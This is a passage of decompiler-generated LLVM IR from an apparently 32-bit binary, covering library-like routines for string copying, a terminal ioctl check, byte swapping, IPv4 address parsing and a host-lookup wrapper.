  uselistorder i32 %v0_804d0118, { 1, 0 }
  uselistorder i32 %v2_804d000, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804d00c, { 2, 1, 0 }
  uselistorder i32 %v0_804d00b, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804d006, { 1, 0 }
}

define i32 @function_804d014(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d014:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804d014 = load i32, i32* @edi, align 4
  %v0_804d015 = load i32, i32* @esi, align 4
  %v0_804d016 = load i32, i32* @ebx, align 4
  store i32 %v0_804d016, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804d01f = inttoptr i32 %arg1 to i8*
  %v2_804d01f = call i32 @function_804ce94(i8* %v1_804d01f)
  %v1_804d024 = add i32 %v2_804d01f, 1
  store i32 %v1_804d024, i32* @esi, align 4
  %v1_804d02a = call i32 @function_804d73a(i32 %v1_804d024)
  store i32 %v1_804d02a, i32* %ebx.global-to-local, align 4
  %v1_804d034 = icmp eq i32 %v1_804d02a, 0
  br i1 %v1_804d034, label %dec_label_pc_804d044, label %dec_label_pc_804d038

dec_label_pc_804d038:                             ; preds = %dec_label_pc_804d014
  %v0_804d039 = load i32, i32* @esi, align 4
  %v0_804d03a = load i32, i32* @edi, align 4
  %v3_804d03c = inttoptr i32 %v1_804d02a to i16*
  %v4_804d03c = call i32 @function_804ce38(i16* %v3_804d03c, i32 %v0_804d03a, i32 %v0_804d039)
  %v0_804d044.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d044

dec_label_pc_804d044:                             ; preds = %dec_label_pc_804d014, %dec_label_pc_804d038
  %v0_804d044 = phi i32 [ 0, %dec_label_pc_804d014 ], [ %v0_804d044.pre, %dec_label_pc_804d038 ]
  %v2_804d046 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d046, i32* @ebx, align 4
  store i32 %v0_804d015, i32* @esi, align 4
  store i32 %v0_804d014, i32* @edi, align 4
  ret i32 %v0_804d044

; uselistorder directives
  uselistorder i32 %v1_804d02a, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804d044, { 1, 0 }
}

define i32 @function_804d068(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d068:
  %stack_var_-60 = alloca i32, align 4
  %v3_804d074 = call i32 @function_804d088(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_804d079 = icmp eq i32 %v3_804d074, 0
  %v1_804d07b = zext i1 %v1_804d079 to i32
  ret i32 %v1_804d07b
}

define i32 @function_804d088(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_804d088:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_5()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804d088 = load i32, i32* @esi, align 4
  %v0_804d089 = load i32, i32* @ebx, align 4
  store i32 %v0_804d089, i32* %stack_var_-8, align 4
  %v2_804d08d = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804d08d, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_804d09f = call i32 @function_804b364(i32 %arg1, i32 21505, i32 %v2_804d08d)
  store i32 %v3_804d09f, i32* %eax.global-to-local, align 4
  store i32 %v3_804d09f, i32* @esi, align 4
  %v1_804d0a9 = icmp eq i32 %v3_804d09f, 0
  %v1_804d0ab = icmp eq i1 %v1_804d0a9, false
  br i1 %v1_804d0ab, label %dec_label_pc_804d0f0, label %dec_label_pc_804d0ad

dec_label_pc_804d0ad:                             ; preds = %dec_label_pc_804d088
  %v3_804d0ad = load i32, i32* %stack_var_-44, align 4
  %v1_804d0b1 = load i32, i32* @ebx, align 4
  %v2_804d0b1 = inttoptr i32 %v1_804d0b1 to i32*
  store i32 %v3_804d0ad, i32* %v2_804d0b1, align 4
  %v1_804d0b7 = load i32, i32* @ebx, align 4
  %v2_804d0b7 = add i32 %v1_804d0b7, 4
  %v3_804d0b7 = inttoptr i32 %v2_804d0b7 to i32*
  %v1_804d0be = load i32, i32* @ebx, align 4
  %v2_804d0be = add i32 %v1_804d0be, 8
  %v3_804d0be = inttoptr i32 %v2_804d0be to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_804d0c5 = load i32, i32* @ebx, align 4
  %v2_804d0c5 = add i32 %v1_804d0c5, 12
  %v3_804d0c5 = inttoptr i32 %v2_804d0c5 to i32*
  store i32 %tmp3, i32* %v3_804d0c5, align 4
  %v4_804d0c8 = zext i8 %tmp to i32
  %v5_804d0c8 = load i32, i32* %eax.global-to-local, align 4
  %v6_804d0c8 = and i32 %v5_804d0c8, -256
  %v7_804d0c8 = or i32 %v6_804d0c8, %v4_804d0c8
  store i32 %v7_804d0c8, i32* %eax.global-to-local, align 4
  %v2_804d0cc = load i32, i32* @ebx, align 4
  %v3_804d0cc = add i32 %v2_804d0cc, 16
  %v4_804d0cc = inttoptr i32 %v3_804d0cc to i8*
  store i8 %tmp, i8* %v4_804d0cc, align 1
  %v0_804d0cf = load i32, i32* %eax.global-to-local, align 4
  %v2_804d0d2 = ptrtoint i32* %stack_var_-27 to i32
  %v0_804d0d7 = load i32, i32* @ebx, align 4
  %v1_804d0d7 = add i32 %v0_804d0d7, 17
  store i32 %v1_804d0d7, i32* %eax.global-to-local, align 4
  %v4_804d0db = call i32 @function_8050008(i32 %v1_804d0d7, i32 %v2_804d0d2, i32 19, i32 %v0_804d0cf)
  store i32 %v4_804d0db, i32* %eax.global-to-local, align 4
  %v3_804d0e8 = inttoptr i32 %v4_804d0db to i8*
  %v4_804d0e8 = call i32 @function_804ce60(i8* %v3_804d0e8, i32 0, i32 13)
  store i32 %v4_804d0e8, i32* %eax.global-to-local, align 4
  %v0_804d0f0.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804d0f0

dec_label_pc_804d0f0:                             ; preds = %dec_label_pc_804d088, %dec_label_pc_804d0ad
  %v0_804d0f0 = phi i32 [ %v3_804d09f, %dec_label_pc_804d088 ], [ %v0_804d0f0.pre, %dec_label_pc_804d0ad ]
  store i32 %v0_804d0f0, i32* %eax.global-to-local, align 4
  %v2_804d0f5 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d0f5, i32* @ebx, align 4
  store i32 %v0_804d088, i32* @esi, align 4
  ret i32 %v0_804d0f0

; uselistorder directives
  uselistorder i32 %v0_804d0f0, { 1, 0 }
  uselistorder i32 %v3_804d09f, { 0, 2, 1, 3 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_804d0f0, { 1, 0 }
}

define i32 @function_804d0f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d0f8:
  %v1_804d0fc = trunc i32 %arg1 to i16
  %v2_804d0fc = call i16 @llvm.bswap.i16(i16 %v1_804d0fc)
  %v3_804d0fc = zext i16 %v2_804d0fc to i32
  ret i32 %v3_804d0fc
}

define i32 @function_804d104(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d104:
  %v1_804d108 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_804d108
}

define i32 @function_804d10b(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d10b:
  %v1_804d10f = trunc i32 %arg1 to i16
  %v2_804d10f = call i16 @llvm.bswap.i16(i16 %v1_804d10f)
  %v3_804d10f = zext i16 %v2_804d10f to i32
  ret i32 %v3_804d10f
}

define i32 @function_804d117(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d117:
  %v1_804d11b = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_804d11b
}

define i32 @function_804d120(i8* %arg1) local_unnamed_addr {
dec_label_pc_804d120:
  %v4_804d127 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_804d13a

dec_label_pc_804d13a:                             ; preds = %dec_label_pc_804d1e2, %dec_label_pc_804d120
  %v3_804d1cb = phi i32 [ 0, %dec_label_pc_804d120 ], [ %v5_804d1d0, %dec_label_pc_804d1e2 ]
  %v2_804d1d9 = phi i32 [ 0, %dec_label_pc_804d120 ], [ %v3_804d1d9, %dec_label_pc_804d1e2 ]
  %v0_804d148 = phi i32 [ %v4_804d127, %dec_label_pc_804d120 ], [ %v1_804d1e2, %dec_label_pc_804d1e2 ]
  %v1_804d13a = inttoptr i32 %v0_804d148 to i8*
  %v2_804d13a = load i8, i8* %v1_804d13a, align 1
  %v8_804d13a = icmp eq i8 %v2_804d13a, 48
  br i1 %v8_804d13a, label %dec_label_pc_804d148, label %dec_label_pc_804d13f

dec_label_pc_804d13f:                             ; preds = %dec_label_pc_804d13a
  br label %dec_label_pc_804d167

dec_label_pc_804d148:                             ; preds = %dec_label_pc_804d13a
  %v1_804d148 = add i32 %v0_804d148, 1
  %v1_804d149 = inttoptr i32 %v1_804d148 to i8*
  %v2_804d149 = load i8, i8* %v1_804d149, align 1
  %v3_804d149 = zext i8 %v2_804d149 to i32
  %v4_804d149 = load i32, i32* @eax, align 4
  %v5_804d149 = and i32 %v4_804d149, -256
  %v6_804d149 = or i32 %v5_804d149, %v3_804d149
  store i32 %v6_804d149, i32* @eax, align 4
  %v10_804d14b = icmp eq i8 %v2_804d149, 120
  br i1 %v10_804d14b, label %dec_label_pc_804d15f, label %dec_label_pc_804d14f

dec_label_pc_804d14f:                             ; preds = %dec_label_pc_804d148
  %v10_804d14f = icmp eq i8 %v2_804d149, 88
  br i1 %v10_804d14f, label %dec_label_pc_804d15f, label %dec_label_pc_804d153

dec_label_pc_804d153:                             ; preds = %dec_label_pc_804d14f
  br label %dec_label_pc_804d167

dec_label_pc_804d15f:                             ; preds = %dec_label_pc_804d14f, %dec_label_pc_804d148
  %v1_804d15f = add i32 %v0_804d148, 2
  br label %dec_label_pc_804d167

dec_label_pc_804d167:                             ; preds = %dec_label_pc_804d153, %dec_label_pc_804d13f, %dec_label_pc_804d15f
  %v0_804d1bb4 = phi i32 [ %v1_804d148, %dec_label_pc_804d153 ], [ %v0_804d148, %dec_label_pc_804d13f ], [ %v1_804d15f, %dec_label_pc_804d15f ]
  %v0_804d1c113 = phi i32 [ 1, %dec_label_pc_804d153 ], [ 0, %dec_label_pc_804d13f ], [ 0, %dec_label_pc_804d15f ]
  %v0_804d19010 = phi i32 [ 8, %dec_label_pc_804d153 ], [ 10, %dec_label_pc_804d13f ], [ 16, %dec_label_pc_804d15f ]
  %v4_804d1bb.pre = load i32, i32* @edx, align 4
  %v1_804d1bb38 = inttoptr i32 %v0_804d1bb4 to i8*
  %v2_804d1bb39 = load i8, i8* %v1_804d1bb38, align 1
  %v3_804d1bb40 = zext i8 %v2_804d1bb39 to i32
  %v5_804d1bb41 = and i32 %v4_804d1bb.pre, -256
  %v6_804d1bb42 = or i32 %v3_804d1bb40, %v5_804d1bb41
  store i32 %v6_804d1bb42, i32* @edx, align 4
  %v4_804d1bd43 = icmp eq i8 %v2_804d1bb39, 0
  %v1_804d1bf44 = icmp eq i1 %v4_804d1bd43, false
  br i1 %v1_804d1bf44, label %dec_label_pc_804d16b.lr.ph, label %dec_label_pc_804d1c1

dec_label_pc_804d16b.lr.ph:                       ; preds = %dec_label_pc_804d167
  %v6_804d190 = icmp eq i32 %v0_804d19010, 16
  %v1_804d193 = icmp eq i1 %v6_804d190, false
  %v9_804d17b = icmp eq i32 %v0_804d19010, 8
  %v1_804d17e = icmp eq i1 %v9_804d17b, false
  br label %dec_label_pc_804d16b

dec_label_pc_804d16b:                             ; preds = %dec_label_pc_804d16b.lr.ph, %dec_label_pc_804d1b5
  %v6_804d1bb50 = phi i32 [ %v6_804d1bb42, %dec_label_pc_804d16b.lr.ph ], [ %v6_804d1bb, %dec_label_pc_804d1b5 ]
  %v3_804d1bb49 = phi i32 [ %v3_804d1bb40, %dec_label_pc_804d16b.lr.ph ], [ %v3_804d1bb, %dec_label_pc_804d1b5 ]
  %v2_804d1bb48 = phi i8 [ %v2_804d1bb39, %dec_label_pc_804d16b.lr.ph ], [ %v2_804d1bb, %dec_label_pc_804d1b5 ]
  %v0_804d1e247 = phi i32 [ %v0_804d1bb4, %dec_label_pc_804d16b.lr.ph ], [ %v1_804d1b5, %dec_label_pc_804d1b5 ]
  %v4_804d1d046 = phi i32 [ 0, %dec_label_pc_804d16b.lr.ph ], [ %storemerge, %dec_label_pc_804d1b5 ]
  %v0_804d1c145 = phi i32 [ %v0_804d1c113, %dec_label_pc_804d16b.lr.ph ], [ 1, %dec_label_pc_804d1b5 ]
  %v0_804d16e = load i32, i32* @global_var_80559e0, align 32
  %v2_804d173 = mul nuw nsw i32 %v3_804d1bb49, 2
  %v3_804d173 = add i32 %v0_804d16e, %v2_804d173
  %v4_804d173 = inttoptr i32 %v3_804d173 to i16*
  %v5_804d173 = load i16, i16* %v4_804d173, align 2
  %v6_804d173 = zext i16 %v5_804d173 to i32
  store i32 %v6_804d173, i32* @eax, align 4
  %v2_804d177 = and i16 %v5_804d173, 8
  %v3_804d177 = icmp eq i16 %v2_804d177, 0
  br i1 %v3_804d177, label %dec_label_pc_804d190, label %dec_label_pc_804d17b

dec_label_pc_804d17b:                             ; preds = %dec_label_pc_804d16b
  br i1 %v1_804d17e, label %dec_label_pc_804d185, label %dec_label_pc_804d180

dec_label_pc_804d180:                             ; preds = %dec_label_pc_804d17b
  %tmp91 = icmp ult i8 %v2_804d1bb48, 56
  br i1 %tmp91, label %dec_label_pc_804d185, label %dec_label_pc_804d1ec

dec_label_pc_804d185:                             ; preds = %dec_label_pc_804d180, %dec_label_pc_804d17b
  %v4_804d187 = mul i32 %v4_804d1d046, %v0_804d19010
  store i32 %v4_804d187, i32* @eax, align 4
  %v2_804d18a = add i32 %v4_804d187, -48
  %v3_804d18a = add i32 %v2_804d18a, %v3_804d1bb49
  br label %dec_label_pc_804d1ad

dec_label_pc_804d190:                             ; preds = %dec_label_pc_804d16b
  br i1 %v1_804d193, label %dec_label_pc_804d1c1, label %dec_label_pc_804d195

dec_label_pc_804d195:                             ; preds = %dec_label_pc_804d190
  %v2_804d195 = and i32 %v6_804d173, 16
  %v3_804d195 = icmp eq i32 %v2_804d195, 0
  br i1 %v3_804d195, label %dec_label_pc_804d1c1, label %dec_label_pc_804d199

dec_label_pc_804d199:                             ; preds = %dec_label_pc_804d195
  %v2_804d1a3 = mul i32 %v4_804d1d046, 16
  store i32 0, i32* @eax, align 4
  %v3_804d1a9 = add i32 %v2_804d1a3, -87
  br label %dec_label_pc_804d1ad

dec_label_pc_804d1ad:                             ; preds = %dec_label_pc_804d185, %dec_label_pc_804d199
  %v4_804d1bb6 = phi i32 [ %v6_804d1bb50, %dec_label_pc_804d185 ], [ %v2_804d1a3, %dec_label_pc_804d199 ]
  %storemerge = phi i32 [ %v3_804d18a, %dec_label_pc_804d185 ], [ %v3_804d1a9, %dec_label_pc_804d199 ]
  %tmp92 = icmp ult i32 %storemerge, 256
  br i1 %tmp92, label %dec_label_pc_804d1b5, label %dec_label_pc_804d1ec

dec_label_pc_804d1b5:                             ; preds = %dec_label_pc_804d1ad
  %v1_804d1b5 = add i32 %v0_804d1e247, 1
  %v1_804d1bb = inttoptr i32 %v1_804d1b5 to i8*
  %v2_804d1bb = load i8, i8* %v1_804d1bb, align 1
  %v3_804d1bb = zext i8 %v2_804d1bb to i32
  %v5_804d1bb = and i32 %v4_804d1bb6, -256
  %v6_804d1bb = or i32 %v3_804d1bb, %v5_804d1bb
  store i32 %v6_804d1bb, i32* @edx, align 4
  %v4_804d1bd = icmp eq i8 %v2_804d1bb, 0
  %v1_804d1bf = icmp eq i1 %v4_804d1bd, false
  br i1 %v1_804d1bf, label %dec_label_pc_804d16b, label %dec_label_pc_804d1c1.thread

dec_label_pc_804d1c1.thread:                      ; preds = %dec_label_pc_804d1b5
  br label %dec_label_pc_804d1c5

dec_label_pc_804d1c1:                             ; preds = %dec_label_pc_804d190, %dec_label_pc_804d195, %dec_label_pc_804d167
  %v0_804d1c1.lcssa = phi i32 [ %v0_804d1c113, %dec_label_pc_804d167 ], [ %v0_804d1c145, %dec_label_pc_804d195 ], [ %v0_804d1c145, %dec_label_pc_804d190 ]
  %v4_804d1d0.lcssa = phi i32 [ 0, %dec_label_pc_804d167 ], [ %v4_804d1d046, %dec_label_pc_804d195 ], [ %v4_804d1d046, %dec_label_pc_804d190 ]
  %v0_804d1e2.lcssa = phi i32 [ %v0_804d1bb4, %dec_label_pc_804d167 ], [ %v0_804d1e247, %dec_label_pc_804d195 ], [ %v0_804d1e247, %dec_label_pc_804d190 ]
  %v2_804d1bb.lcssa = phi i8 [ %v2_804d1bb39, %dec_label_pc_804d167 ], [ %v2_804d1bb48, %dec_label_pc_804d195 ], [ %v2_804d1bb48, %dec_label_pc_804d190 ]
  %v4_804d1bd.lcssa = phi i1 [ true, %dec_label_pc_804d167 ], [ false, %dec_label_pc_804d195 ], [ false, %dec_label_pc_804d190 ]
  %v1_804d1c1 = icmp eq i32 %v0_804d1c1.lcssa, 0
  br i1 %v1_804d1c1, label %dec_label_pc_804d1ec, label %dec_label_pc_804d1c5

dec_label_pc_804d1c5:                             ; preds = %dec_label_pc_804d1c1.thread, %dec_label_pc_804d1c1
  %v4_804d1bd.lcssa90 = phi i1 [ true, %dec_label_pc_804d1c1.thread ], [ %v4_804d1bd.lcssa, %dec_label_pc_804d1c1 ]
  %v2_804d1bb.lcssa89 = phi i8 [ %v2_804d1bb, %dec_label_pc_804d1c1.thread ], [ %v2_804d1bb.lcssa, %dec_label_pc_804d1c1 ]
  %v0_804d1e2.lcssa88 = phi i32 [ %v1_804d1b5, %dec_label_pc_804d1c1.thread ], [ %v0_804d1e2.lcssa, %dec_label_pc_804d1c1 ]
  %v4_804d1d0.lcssa87 = phi i32 [ %storemerge, %dec_label_pc_804d1c1.thread ], [ %v4_804d1d0.lcssa, %dec_label_pc_804d1c1 ]
  %v3_804d1c5 = icmp eq i32 %v2_804d1d9, 0
  br i1 %v3_804d1c5, label %dec_label_pc_804d1d0, label %dec_label_pc_804d1cb

dec_label_pc_804d1cb:                             ; preds = %dec_label_pc_804d1c5
  %v5_804d1cb = mul i32 %v3_804d1cb, 256
  br label %dec_label_pc_804d1d0

dec_label_pc_804d1d0:                             ; preds = %dec_label_pc_804d1c5, %dec_label_pc_804d1cb
  %v3_804d1d0 = phi i32 [ %v3_804d1cb, %dec_label_pc_804d1c5 ], [ %v5_804d1cb, %dec_label_pc_804d1cb ]
  %v5_804d1d0 = or i32 %v3_804d1d0, %v4_804d1d0.lcssa87
  %v10_804d1d4 = icmp eq i8 %v2_804d1bb.lcssa89, 46
  %v1_804d1d7 = icmp eq i1 %v10_804d1d4, false
  br i1 %v1_804d1d7, label %dec_label_pc_804d1e8, label %dec_label_pc_804d1d9

dec_label_pc_804d1d9:                             ; preds = %dec_label_pc_804d1d0
  %v11_804d1dc = icmp eq i32 %v2_804d1d9, 3
  br i1 %v11_804d1dc, label %dec_label_pc_804d1ec, label %dec_label_pc_804d1e2

dec_label_pc_804d1e2:                             ; preds = %dec_label_pc_804d1d9
  %v3_804d1d9 = add i32 %v2_804d1d9, 1
  %v1_804d1e2 = add i32 %v0_804d1e2.lcssa88, 1
  br label %dec_label_pc_804d13a

dec_label_pc_804d1e8:                             ; preds = %dec_label_pc_804d1d0
  br i1 %v4_804d1bd.lcssa90, label %dec_label_pc_804d1f4, label %dec_label_pc_804d1ec

dec_label_pc_804d1ec:                             ; preds = %dec_label_pc_804d1d9, %dec_label_pc_804d1c1, %dec_label_pc_804d1ad, %dec_label_pc_804d180, %dec_label_pc_804d1e8
  br label %dec_label_pc_804d1f4

dec_label_pc_804d1f4:                             ; preds = %dec_label_pc_804d1e8, %dec_label_pc_804d1ec
  %v3_804d1f4 = phi i32 [ %v5_804d1d0, %dec_label_pc_804d1e8 ], [ -1, %dec_label_pc_804d1ec ]
  ret i32 %v3_804d1f4

; uselistorder directives
  uselistorder i32 %v5_804d1d0, { 1, 0 }
  uselistorder i32 %v6_804d1bb, { 1, 0 }
  uselistorder i32 %v3_804d1bb, { 1, 0 }
  uselistorder i8 %v2_804d1bb, { 0, 2, 3, 1 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v4_804d187, { 1, 0 }
  uselistorder i32 %v4_804d1d046, { 2, 3, 1, 0 }
  uselistorder i32 %v0_804d19010, { 0, 2, 1 }
  uselistorder i32 %v0_804d148, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804d1d9, { 1, 0, 2 }
  uselistorder i32 %v3_804d1cb, { 1, 0 }
  uselistorder label %dec_label_pc_804d1f4, { 1, 0 }
  uselistorder label %dec_label_pc_804d1ec, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804d1d0, { 1, 0 }
  uselistorder label %dec_label_pc_804d1c5, { 1, 0 }
  uselistorder label %dec_label_pc_804d1c1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d1ad, { 1, 0 }
  uselistorder label %dec_label_pc_804d16b, { 1, 0 }
  uselistorder label %dec_label_pc_804d167, { 2, 0, 1 }
}

define i32 @function_804d200(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d200:
  %stack_var_-4 = alloca i32, align 4
  %v2_804d203 = ptrtoint i32* %stack_var_-4 to i32
  %v2_804d20c = inttoptr i32 %arg1 to i8*
  %v3_804d20c = call i32 @function_8050160(i8* %v2_804d20c, i32 %v2_804d203)
  store i32 -1, i32* @edx, align 4
  %v1_804d217 = icmp eq i32 %v3_804d20c, 0
  br i1 %v1_804d217, label %dec_label_pc_804d21f, label %dec_label_pc_804d21b

dec_label_pc_804d21b:                             ; preds = %dec_label_pc_804d200
  %v3_804d21b = load i32, i32* %stack_var_-4, align 4
  store i32 %v3_804d21b, i32* @edx, align 4
  br label %dec_label_pc_804d21f

dec_label_pc_804d21f:                             ; preds = %dec_label_pc_804d200, %dec_label_pc_804d21b
  %v0_804d21f = phi i32 [ -1, %dec_label_pc_804d200 ], [ %v3_804d21b, %dec_label_pc_804d21b ]
  ret i32 %v0_804d21f

; uselistorder directives
  uselistorder label %dec_label_pc_804d21f, { 1, 0 }
}

define i32 @function_804d228(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d228:
  %stack_var_-4 = alloca i32, align 4
  %v0_804d22b = call i32 @function_804f478()
  %v0_804d230 = load i32, i32* @edx, align 4
  %v2_804d233 = ptrtoint i32* %stack_var_-4 to i32
  %v9_804d24b = call i32 @function_804d258(i32 %arg1, i32* nonnull @global_var_805808c.135, i32 ptrtoint (i32* @global_var_8057ec0.134 to i32), i32 460, i32 %v2_804d233, i32 %v0_804d22b, i32 %v0_804d230, i32 %v0_804d230)
  %v3_804d250 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_804d250
}

define i32 @function_804d258(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_804d258:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_804d258 = load i32, i32* @ebp, align 4
  %v0_804d259 = load i32, i32* @edi, align 4
  %v0_804d25a = load i32, i32* @esi, align 4
  %v0_804d25b = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_804d26b = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_804d26b, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_804d276 = icmp eq i32 %arg1, 0
  br i1 %v4_804d276, label %dec_label_pc_804d582, label %dec_label_pc_804d281

dec_label_pc_804d281:                             ; preds = %dec_label_pc_804d258
  %v1_804d281 = call i32 @function_804b4bc(i32 %v0_804d25b)
  store i32 %v1_804d281, i32* %eax.global-to-local, align 4
  store i32 %v1_804d281, i32* @esi, align 4
  %v1_804d288 = inttoptr i32 %v1_804d281 to i32*
  %v2_804d288 = load i32, i32* %v1_804d288, align 4
  store i32 %v2_804d288, i32* @edi, align 4
  store i32 0, i32* %v1_804d288, align 4
  %v0_804d299 = load i32, i32* @ebx, align 4
  store i32 %v0_804d299, i32* %stack_var_-108, align 4
  %v7_804d2a5 = call i32 @function_8050b8c(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_804d299, i32 %arg5, i32 %arg6, i32 %v1_804d281)
  store i32 %v7_804d2a5, i32* %eax.global-to-local, align 4
  %v1_804d2ad = icmp eq i32 %v7_804d2a5, 0
  br i1 %v1_804d2ad, label %dec_label_pc_804d582, label %dec_label_pc_804d2b5

dec_label_pc_804d2b5:                             ; preds = %dec_label_pc_804d281
  %v1_804d2b9 = inttoptr i32 %arg6 to i32*
  %v2_804d2b9 = load i32, i32* %v1_804d2b9, align 4
  store i32 %v2_804d2b9, i32* %edx.global-to-local, align 4
  %v9_804d2bb = icmp eq i32 %v2_804d2b9, 1
  br i1 %v9_804d2bb, label %dec_label_pc_804d2d5, label %dec_label_pc_804d2c0

dec_label_pc_804d2c0:                             ; preds = %dec_label_pc_804d2b5
  %v9_804d2c0 = icmp eq i32 %v2_804d2b9, 4
  br i1 %v9_804d2c0, label %dec_label_pc_804d2d5, label %dec_label_pc_804d2c5

dec_label_pc_804d2c5:                             ; preds = %dec_label_pc_804d2c0
  %v1_804d2c5 = add i32 %v2_804d2b9, 1
  %v8_804d2c5 = icmp eq i32 %v1_804d2c5, 0
  store i32 %v1_804d2c5, i32* %edx.global-to-local, align 4
  %v1_804d2c6 = icmp eq i1 %v8_804d2c5, false
  br i1 %v1_804d2c6, label %dec_label_pc_804d582, label %dec_label_pc_804d2cc

dec_label_pc_804d2cc:                             ; preds = %dec_label_pc_804d2c5
  %v0_804d2cc = load i32, i32* @esi, align 4
  %v1_804d2cc = inttoptr i32 %v0_804d2cc to i32*
  %v2_804d2cc = load i32, i32* %v1_804d2cc, align 4
  %v11_804d2cc = icmp eq i32 %v2_804d2cc, 2
  %v1_804d2cf = icmp eq i1 %v11_804d2cc, false
  br i1 %v1_804d2cf, label %dec_label_pc_804d582, label %dec_label_pc_804d2d5

dec_label_pc_804d2d5:                             ; preds = %dec_label_pc_804d2cc, %dec_label_pc_804d2c0, %dec_label_pc_804d2b5
  %v0_804d2d5 = load i32, i32* @ebp, align 4
  store i32 %v0_804d2d5, i32* %eax.global-to-local, align 4
  %v0_804d2d7 = load i32, i32* @edi, align 4
  %v1_804d2d7 = load i32, i32* @esi, align 4
  %v2_804d2d7 = inttoptr i32 %v1_804d2d7 to i32*
  store i32 %v0_804d2d7, i32* %v2_804d2d7, align 4
  %v0_804d2d9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d2d9 = sub i32 0, %v0_804d2d9
  %v1_804d2db = urem i32 %v1_804d2d9, 4
  %v2_804d2db = icmp eq i32 %v1_804d2db, 0
  store i32 %v1_804d2db, i32* %eax.global-to-local, align 4
  %v0_804d2f0.pre = load i32, i32* @ebx, align 4
  br i1 %v2_804d2db, label %dec_label_pc_804d2ec, label %dec_label_pc_804d2e0

dec_label_pc_804d2e0:                             ; preds = %dec_label_pc_804d2d5
  %v2_804d2e0 = sub i32 %v0_804d2f0.pre, %v1_804d2db
  %v7_804d2e0 = icmp ult i32 %v0_804d2f0.pre, %v1_804d2db
  br i1 %v7_804d2e0, label %dec_label_pc_804d57d, label %dec_label_pc_804d2e8

dec_label_pc_804d2e8:                             ; preds = %dec_label_pc_804d2e0
  %v0_804d2e8 = load i32, i32* @ebp, align 4
  %v2_804d2e8 = add i32 %v0_804d2e8, %v1_804d2db
  store i32 %v2_804d2e8, i32* @ebp, align 4
  store i32 %v2_804d2e0, i32* @ebx, align 4
  br label %dec_label_pc_804d2ec

dec_label_pc_804d2ec:                             ; preds = %dec_label_pc_804d2d5, %dec_label_pc_804d2e8
  %v0_804d2f0 = phi i32 [ %v2_804d2e0, %dec_label_pc_804d2e8 ], [ %v0_804d2f0.pre, %dec_label_pc_804d2d5 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_804d2b9, align 4
  %tmp43 = icmp ult i32 %v0_804d2f0, 4
  br i1 %tmp43, label %dec_label_pc_804d57d, label %dec_label_pc_804d2ff

dec_label_pc_804d2ff:                             ; preds = %dec_label_pc_804d2ec
  %v0_804d2ff = load i32, i32* @ebx, align 4
  %v1_804d2ff = add i32 %v0_804d2ff, -4
  store i32 %v1_804d2ff, i32* %eax.global-to-local, align 4
  %tmp44 = icmp ult i32 %v1_804d2ff, 8
  br i1 %tmp44, label %dec_label_pc_804d57d, label %dec_label_pc_804d30b

dec_label_pc_804d30b:                             ; preds = %dec_label_pc_804d2ff
  %v0_804d30b = load i32, i32* @ebp, align 4
  %v1_804d30b = add i32 %v0_804d30b, 4
  store i32 %v1_804d30b, i32* %edx.global-to-local, align 4
  %v1_804d30e = add i32 %v0_804d2ff, -12
  store i32 %v1_804d30e, i32* %eax.global-to-local, align 4
  store i32 %v1_804d30b, i32* %stack_var_-92, align 4
  %v3_804d317 = inttoptr i32 %v1_804d30b to i32*
  store i32 %v0_804d30b, i32* %v3_804d317, align 4
